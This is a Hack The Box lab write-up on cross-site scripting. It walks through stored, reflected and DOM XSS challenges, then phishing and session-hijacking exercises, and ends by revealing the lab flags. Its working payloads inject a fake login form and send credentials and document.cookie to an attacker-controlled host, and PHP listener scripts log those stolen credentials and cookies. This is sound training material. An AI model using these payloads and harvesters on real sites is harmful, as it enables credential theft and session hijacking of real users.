# HTB-Cross Site Scripting (XSS)

## Table of Contents
0. [Tools](#tools)
    1. [XSS Scanner](#xss-scanner)
    2. [Payload](#payload)
1. [XSS Basics](#xss-basics)
    1. [Stored XSS](#stored-xss)
    2. [Reflected XSS](#reflected-xss)
    3. [DOM XSS](#dom-xss)
    4. [XSS Discovery](#xss-discovery)
2. [XSS Attacks](#xss-attacks)
    1. [Phishing](#phishing)
    2. [Session Hijacking](#session-hijacking)
3. [Skill Assesment](#skill-assesment)

## Tools
### XSS Scanner
1. [XSStrike](https://github.com/s0md3v/XSStrike)
2. [BruteXSS](https://github.com/rajeshmajumdar/BruteXSS)
3. [xsser](https://github.com/epsylon/xsser)
### Payload
1. [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
2. [PayloadBox](https://github.com/payloadbox/xss-payload-list)

## XSS Basics
### Stored XSS
#### Challenges
1. To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.

    We can use this payload:

    ```js
    <script>alert(document.cookie)</script>
    ```

### Reflected XSS
#### Challenges
1. To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.

    We can use this payload:

    ```js
    <script>alert(document.cookie)</script>
    ```

### DOM XSS
#### Challenges
1. To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.

    We can use this payload:

    ```js
    <img src="" onerror=alert(document.cookie)>
    ```

### XSS Discovery
#### Challenges
1. Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter?

    We can use **xsstrike.py** to solve this.
    
    ```bash
    python xsstrike.py -u "http://94.237.120.137:53500/?fullname=a&username=a&password=bc&email=ad%40gmail.com"
    ```

    ![alt text](<Assets/XSS Discovery - 1.png>)

    We can see the **email** paramater is vuln. The answer is **email**.

2. What type of XSS was found on the above server? "name only"

    Based on the previous image, we can see that the email parameter has **reflected XSS**. So the answer is **reflected**. 

## XSS Attacks
### Phishing
#### Challenges
1. Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag.

    First, we need to discover working XSS payload. We can use **xsstrike.py** to find the working payload.

    ```bash
    python xsstrike.py -u "http://10.129.234.166/phishing/index.php?url=testing"
    ```
    ![alt text](<Assets/Phishing - 1.png>)

    We can see that both of the working payload has **'<** in the start. The input field probably look like this:

    ```html
    <img src='[INPUT]'>
    ```
    Here the payloads:

    ```js
    '><script>document.write('<h3>Please login to continue</h3><form action="http://10.10.15.123:8080"><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script>
    ```
    We can setup the listener, here the php code of it:

    ```php
    <?php
    if (isset($_GET['username']) && isset($_GET['password'])) {
        $file = fopen("creds.txt", "a+");
        fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
        header("Location: http://10.129.234.166/phishing/index.php");
        fclose($file);
        exit();
    }
    ?>
    ```
    Here the setup step:

    ```bash
    mkdir /tmp/tmpserver
    cd /tmp/tmpserver
    vi index.php #at this step we wrote our index.php file
    sudo php -S 0.0.0.0:8080
    ```
    Then, we can submit the payload and copy the url result.

    ```url
    http://10.129.234.166/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3D%22http%3A%2F%2F10.10.15.123%3A8080%22%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E
    ```
    AFter that, we can copy the url into [/phising/send.php](http://10.129.234.166/phishing/send.php). If it successful, the listener will catch the username and password.

    ![alt text](<Assets/Phishing - 2.png>)
    
    We can see it catch **admin:p1zd0nt57341myp455**. We can use the credential to login in this url, [/phishing/login.php](http://10.129.234.166/phishing/login.php). The answer is **HTB{r3f13c73d_cr3d5_84ck_2_m3}**.

### Session Hijacking
#### Challenges
1. Try to repeat what you learned in this section to identify the vulnerable input field and find a working XSS payload, and then use the 'Session Hijacking' scripts to grab the Admin's cookie and use it in 'login.php' to get the flag.

    First, we need to host index.php, it will catch the vuln field.

    ```php
    <?php
    if (isset($_GET['c'])) {
        $list = explode(";", $_GET['c']);
        foreach ($list as $key => $value) {
            $cookie = urldecode($value);
            $file = fopen("cookies.txt", "a+");
            fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
            fclose($file);
        }
    }
    ?>
    ```

    Here the setup step:

    ```bash
    mkdir /tmp/tmpserver
    cd /tmp/tmpserver
    vi index.php #at this step we wrote our index.php file
    sudo php -S 0.0.0.0:8080
    ```

    Then, we can copy this payload in the different fields (fullname, username, and profile picture URL). Here the working payload:

    ```js
    "><script src="http://10.10.14.144:8080/fullname"></script>
    "><script src="http://10.10.14.144:8080/username"></script>
    "><script src="http://10.10.14.144:8080/profile"></script>
    ```
    ![alt text](<Assets/Session Hijacking - 1.png>)

    We can see that the vuln field is Profile Picture URL. Then, we can host this script.js to catch the cookie.

    ```js
    new Image().src='http://10.10.14.144:8080/index.php?c='+document.cookie
    ```
    Once we restart the server, we can copy this payload into the vuln field:

    ```js
    "><script src="http://10.10.14.144:8080/script.js"></script>
    ```
    ![alt text](<Assets/Session Hijacking - 2.png>)

    We got **cookie=c00k1355h0u1d8353cu23d**. Then, we go to **/hijack/login.php** and set the cookie.

    ![alt text](<Assets/Session Hijacking - 3.png>)

    Once we refresh, we will get the flag. The answer is `HTB{4lw4y5_53cur3_y0ur_c00k135}`.

## Skill Assesment
1. What is the value of the 'flag' cookie?

    First, we need to host index.php, it will catch the vuln field.

     ```php
    <?php
    if (isset($_GET['c'])) {
        $list = explode(";", $_GET['c']);
        foreach ($list as $key => $value) {
            $cookie = urldecode($value);
            $file = fopen("cookies.txt", "a+");
            fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
            fclose($file);
        }
    }
    ?>
    ```
    Here the setup step:

    ```bash
    mkdir /tmp/tmpserver
    cd /tmp/tmpserver
    vi index.php #at this step we wrote our index.php file
    sudo php -S 0.0.0.0:8080
    ```

    We can go to **/assessment** endpoint and doing some exploration. We will find **search** and **comment** input field. I have tested the **search** input field with some payloads but it didnt work. So i moved to **comment** input field. The **name** and **email** section need a valid value, so i avoid doing XSS on it. We can test **comment** and **website** section, here the working payload:

    ```js
    '><script src=http://10.10.14.144:8080/comment></script>
    '><script src=http://10.10.14.144:8080/website></script>
    ```
    ![alt text](<Assets/Skill Assesment - 1.png>)

    We can see that the **website** section is vuln to XSS. Now, we can setup the script.js.

    ```js
    new Image().src='http://10.10.14.144:8080/index.php?c='+document.cookie
    ```
    Then, we can use this payload:

    ```js
    '><script src="http://10.10.14.144:8080/script.js"></script>
    ```
    ![alt text](<Assets/Skill Assesment - 2.png>)

    Then answer is **HTB{cr055_5173_5cr1p71n6_n1nj4}**.